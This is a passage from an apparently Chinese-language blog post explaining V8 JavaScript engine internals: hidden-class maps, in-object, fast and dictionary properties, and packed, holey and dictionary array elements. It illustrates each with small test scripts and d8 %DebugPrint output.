0x27984250c749</span><br><span class="line"> - elements = 0x23ac56e02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x23ac56e02241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 10 (data field 0)</span><br><span class="line">    #y: 11 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x1e016e18f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x1e016e18f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x27984250c919 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x27984250c749 &lt;Object map = 0x1e016e18f829&gt;</span><br><span class="line"> - constructor: 0x2672a3c30041 &lt;JSFunction Point (sfi = 0x2672a3c2fc91)&gt;</span><br><span class="line"> - code cache: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x27984250c969: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x1e016e18f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x27984250c749</span><br><span class="line"> - elements = 0x23ac56e02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x23ac56e02241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x1e016e18f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x1e016e18f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x27984250c919 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x27984250c749 &lt;Object map = 0x1e016e18f931&gt;</span><br><span class="line"> - constructor: 0x2672a3c30041 &lt;JSFunction Point (sfi = 0x2672a3c2fc91)&gt;</span><br><span class="line"> - code cache: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br></pre></td></tr></table></figure><p>结论：相同的map值</p><h4 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h4><p>add p2.z = 14;<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-074842.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --allow_natives_syntax test.js </span><br><span class="line">DebugPrint: 0x252f4f50c891: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x2d1249b8f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x252f4f50c761</span><br><span class="line"> - elements = 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 10 (data field 0)</span><br><span class="line">    #y: 11 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x2d1249b8f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x252f4f50c931 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map = 0x2d1249b8f829&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi = 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x252f4f50c981: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x2d1249b8f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x252f4f50c761</span><br><span class="line"> - elements = 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x2d1249b8f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x252f4f50c931 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map = 0x2d1249b8f931&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi = 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x252f4f50c981: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x2d1249b8f989 [FastProperties]</span><br><span class="line"> - prototype = 0x252f4f50c761</span><br><span class="line"> - elements = 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line">    #z: 14 (data field 2)</span><br><span class="line"> &#125;</span><br><span class="line"> 0x2d1249b8f989: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 7</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f8d9 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #3: 0x252f4f50ca51 &lt;FixedArray[11]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map = 0x2d1249b8f931&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi = 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br></pre></td></tr></table></figure></p><p>结论：指向一个新的map</p><h3 id="property的管理方法"><a href="#property的管理方法" class="headerlink" title="property的管理方法"></a>property的管理方法</h3><h4 id="In-Object-Properties"><a href="#In-Object-Properties" class="headerlink" title="In-Object Properties"></a>In-Object Properties</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">this</span>.x = x;</span><br><span class="line"> <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">10</span>, <span class="number">11</span>);</span><br><span class="line">%DebugPrint(p1)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-144639.png" alt="">V8支持所谓的对象内属性，它们被直接保存在对象上，和对象在同一块内存区域。这种属性是V8中速度最快的属性，能够被直接访问。对象内属性的个数由对象初始化大小决定。如果要添加的属性超出对象的大小，这些属性就会被放入properties store中。properties store会增加一层属性访问的消耗，但是不受大小的限制。 </p><h4 id="Fast-Properties"><a href="#Fast-Properties" class="headerlink" title="Fast Properties"></a>Fast Properties</h4><p>一般来说，我们会把属性保存在线性的properties store中，作为快速属性。快速属性可以通过简单的索引在properties store中访问。不过为了从属性名从properties store获取实际位置，我们要去HiddenClass上的 descriptor array中查询 。具体来讲，这一步骤是先根据属性名搜寻隐藏类的descriptor array，然后得到到数组的偏移地址，然后根据偏移地址到properties store上读取属性信息。实际上，第一次查找属性的时候难免会经历一次隐藏类的哈希查找，但下次一般会结合内联缓存，直接采用缓存的位移来存取属性。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-080119.jpg" alt=""></p><h4 id="Slow-Properties"><a href="#Slow-Properties" class="headerlink" title="Slow Properties"></a>Slow Properties</h4><p>  然而，若是有很多属性从对象上添加或者删除，就需要花费很多时间和内存来维护descriptor array以及隐藏类。因此，V8也支持所谓的慢属性。拥有慢属性的对象会拥有一个自给的字典作为它的properties store（如上图所示）。这种情况下，所有属性的元信息不再储存在隐藏类的descriptor array中，而是直接保存在属性字典上。因此，此时属性的添加和移除不用再去更新指向的隐藏类。因为内联缓存不适用保存在字典中的属性，所以慢属性一般要比快属性慢。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-080209.jpg" alt=""></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>列表内容有三种不同类型的命名属性：对象内属性，快属性，以及慢/字典属性。<br>  1. 对象内属性直接储存在对象自身上，提供最快的属性访问。<br>  2. 快属性活跃在properties store上，所有相关的元信息都在隐藏类的descriptor array中。<br>  3. 慢属性保存在一个自给的属性字典上，属性的元信息不再与隐藏类有关。<br>慢属性提供高效的属性添加删除，但是访问速度要慢于快速属性和对象内对象。</p><h2 id="Elements-or-array-indexed-Properties"><a href="#Elements-or-array-indexed-Properties" class="headerlink" title="Elements or array-indexed Properties"></a>Elements or array-indexed Properties</h2><p>  目前为止我们介绍了命名属性并且忽略了通常出现在数组中的整数索引属性。处理这种整数型属性要比命名属性简单很多。<br>所有的整数型属性都被单独保存在一个elements store中，并且有多达20种元素类型。</p><h3 id="Packed-or-Holey-Elements"><a href="#Packed-or-Holey-Elements" class="headerlink" title="Packed or Holey Elements"></a>Packed or Holey Elements</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> o = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>];</span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "b".</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line"><span class="keyword">delete</span> o[<span class="number">1</span>];                <span class="comment">// Introduces a hole in the elements store.</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "undefined"; property 1 does not exist.</span></span><br><span class="line">o.__proto__ = &#123;<span class="number">1</span>: <span class="string">"B"</span>&#125;;     <span class="comment">// Define property 1 on the prototype.</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line">print(o[<span class="number">0</span>]);          <span class="comment">// Prints "a".</span></span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "B".</span></span><br><span class="line">print(o[<span class="number">2</span>]);          <span class="comment">// Prints "c".</span></span><br><span class="line">print(o[<span class="number">3</span>]);          <span class="comment">// Prints undefined</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --allow_natives_syntax test.js </span><br><span class="line">b</span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map = 0x236e9503b71 [FastProperties]</span><br><span class="line"> - prototype = 0x92dae107f51</span><br><span class="line"> - elements = 0xf279b90c861 &lt;FixedArray[3]&gt; [FAST_ELEMENTS (COW)]</span><br><span class="line"> - length = 3</span><br><span class="line"> - properties = 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0xf279b90c861 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b408191 &lt;String[1]: b&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e9503b71: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x236e9503d29 &lt;Map(FAST_HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors #1: 0x92dae108a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - transitions #1: 0x92dae108a81 &lt;TransitionArray[5]&gt;</span><br><span class="line">     0x31013b404069 &lt;Symbol: elements_transition_symbol&gt;: (transition to FAST_HOLEY_ELEMENTS) -&gt; 0x236e9503e31 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype: 0x92dae107f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi = 0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map = 0x236e9503e31 [FastProperties]</span><br><span class="line"> - prototype = 0x92dae107f51</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - length = 3</span><br><span class="line"> - properties = 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b402351 &lt;the_hole&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e9503e31: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x236e9503b71 &lt;Map(FAST_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x92dae108a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x92dae107f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi = 0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map = 0x236e950f779 [FastProperties]</span><br><span class="line"> - prototype = 0xf279b90c9e9</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - length = 3</span><br><span class="line"> - properties = 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0xf279b90c919 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b402351 &lt;the_hole&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e950f779: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x31013b402311 &lt;undefined&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0xf279b90cad9 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0xf279b90c9e9 &lt;Object map = 0x236e950f7d1&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi = 0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">B</span><br><span class="line">c</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-16-082449.jpg" alt=""><br>  简言之，如果属性在接收者上找不到（接受者可以理解为要访问的属性或者方法指向的那个对象），那么就会继续到原型链上找。<br>这些元素是自给自足的，换言之，我们不需要在隐藏类上储存这些索引属性。另外，我们需要一个特殊的值，称之为空洞，来标记那些不存在属性。这点对于数组方法的性能很关键。<br>若是我们知道elements store没有空洞，是被填满的，我们可以提高本地操作（指无需原型链参与）的性能，不需要再去花费昂贵的代价查找原型链。</p><h3 id="Fast-or-Dictionary-Elements"><a href="#Fast-or-Dictionary-Elements" class="headerlink" title="Fast or Dictionary Elements"></a>Fast or Dictionary Elements</h3><p>  第二个关于元素的主要的区分为是否是快速或是字典模式。快速元素就是VM内部简单的将数组索引与elements store中的索引映射。<br>然而，这种简单表示，在那种有很大的空洞以及很少位置被占用的数组上是相当浪费的。在这种情况下，我们将转换成字典模式，这会减小内存但轻微的牺牲性能。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sparseArray = [];</span><br><span class="line">sparseArray[<span class="number">9999</span>] = <span class="string">"foo"</span>; <span class="comment">// Creates an array with dictionary elements.</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r --allow_natives_syntax test.js </span><br><span class="line">Starting program: /home/parallels/v8/v8/out.gn/x64.debug/d8 --allow_natives_syntax test.js</span><br><span class="line">DebugPrint: 0x6ed6db8c769: [JSArray]</span><br><span class="line"> - map = 0x16a58d0f779 [FastProperties]</span><br><span class="line"> - prototype = 0x37db83507f51</span><br><span class="line"> - elements = 0x6ed6db8c799 &lt;FixedArray[17]&gt; [DICTIONARY_ELEMENTS]</span><br><span class="line"> - length = 10000</span><br><span class="line"> - properties = 0x38a1eb682241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3529df1b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0x6ed6db8c799 &lt;FixedArray[17]&gt; &#123;</span><br><span class="line">   9999: 0x37db8352faa9 &lt;String[3]: foo&gt; (data, dict_index: 0, attrs: [WEC])</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-18-145330.png" alt=""><br>0x270F=9999</p><p>  在这个例子中，如果给这个数组分配完整的10k个空间将会造成极大浪费。而实际上V8是创建了一个key-value-descriptor的triplets。这个例子中的key是“9999”，value是“foo”，而descriptor是使用的默认值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> array = [];</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(array, <span class="number">0</span>, &#123;<span class="attr">value</span>: <span class="string">"fixed"</span>, <span class="attr">configurable</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">%DebugPrint(array)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r --allow_natives_syntax test.js </span><br><span class="line">Starting program: /home/parallels/v8/v8/out.gn/x64.debug/d8 --allow_natives_syntax test.js</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">[New Thread 0x7ffff43f1700 (LWP 18068)]</span><br><span class="line">DebugPrint: 0x28f5f190c759: [JSArray]</span><br><span class="line"> - map = 0x1e39b868f881 [FastProperties]</span><br><span class="line"> - prototype = 0x61172b07f51</span><br><span class="line"> - elements = 0x28f5f190c849 &lt;FixedArray[17]&gt; [DICTIONARY_ELEMENTS]</span><br><span class="line"> - length = 1</span><br><span class="line"> - properties = 0x3c90a5102241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x2a07bddb6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements = 0x28f5f190c849 &lt;FixedArray[17]&gt; &#123;</span><br><span class="line">   0: 0x3c90a5111569 &lt;String[5]: fixed&gt; (data, dict_index: 0, attrs: [___])</span><br><span class="line"> &#125;</span><br><span class="line">0x1e39b868f881: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: DICTIONARY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x1e39b8683e31 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x61172b08a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x61172b07f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x61172b07f71 &lt;JSFunction Array (sfi = 0x3c90a513d6c1)&gt;</span><br><span class="line"> - code cache: 0x3c90a5102241 